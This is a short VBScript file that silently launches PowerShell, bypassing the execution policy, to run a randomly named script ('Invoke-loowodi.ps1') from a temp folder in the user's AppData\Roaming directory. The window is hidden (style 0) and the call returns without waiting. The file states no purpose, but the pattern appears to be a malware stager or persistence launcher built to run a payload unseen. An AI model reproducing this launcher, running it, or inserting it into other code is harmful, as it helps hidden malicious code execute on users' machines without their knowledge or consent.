command = "powershell.exe -nologo -noninteractive -ExecutionPolicy Bypass -command ""& $env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"""
set shell = CreateObject("WScript.Shell")
shell.Run command,0,false
